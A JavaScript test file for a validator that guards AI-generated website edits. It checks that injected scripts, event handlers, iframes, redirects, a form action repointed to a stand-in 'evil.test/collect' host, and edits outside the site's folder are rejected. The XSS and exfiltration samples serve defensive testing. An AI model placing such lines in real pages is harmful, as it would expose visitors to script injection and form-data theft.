// node --test agent/: the rules that keep AI edits safe to publish.
import { test } from "node:test";
import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import { checkHtml, checkPaths } from "./validate.mjs";

const formAction = "https://portal.test/api/forms/joe";
const good = readFileSync(new URL("../templates/trades/index.html", import.meta.url), "utf8")
  .replace(/\{\{FORM_ACTION\}\}/g, formAction)
  .replace(/\{\{[A-Z0-9_]+\}\}/g, "x");

test("a filled-in template passes", () => assert.deepEqual(checkHtml(good, { formAction }), []));

test("injected script, handlers, iframes, and redirects fail", () => {
  const bad = (s) => checkHtml(good.replace("</body>", `${s}</body>`), { formAction }).length > 0;
  assert.ok(bad('<script src="https://evil.test/x.js"></script>'));
  assert.ok(bad("<script>fetch('https://evil.test')</script>"));
  assert.ok(bad('<img src=x onerror="alert(1)">'));
  assert.ok(bad('<a href="javascript:alert(1)">x</a>'));
  assert.ok(bad('<iframe src="https://evil.test"></iframe>'));
  assert.ok(bad('<meta http-equiv="refresh" content="0;url=https://evil.test">'));
  assert.ok(!bad('<iframe src="https://www.google.com/maps/embed?pb=1"></iframe>'));
});

test("the form, footer, placeholders, and em dashes are protected", () => {
  assert.ok(checkHtml(good.replace(formAction, "https://evil.test/collect"), { formAction }).some((p) => p.includes("form posts")));
  assert.ok(checkHtml(good.replace("Site by", "Made by"), { formAction }).some((p) => p.includes("footer")));
  assert.ok(checkHtml(good.replace("<h1", "<h1>{{HEADLINE}}</h1><h1"), { formAction }).some((p) => p.includes("PLACEHOLDERS")));
  assert.ok(checkHtml(good.replace("</h1>", " — now</h1>"), { formAction }).some((p) => p.includes("em dash")));
});

test("only the request's own site folder may change", () => {
  assert.deepEqual(checkPaths(["sites/joe/index.html", "sites/joe/img/t1-1.jpg"], "joe"), []);
  assert.equal(checkPaths(["sites/other/index.html", "AGENTS.md", ".github/workflows/agent.yml"], "joe").length, 3);
});
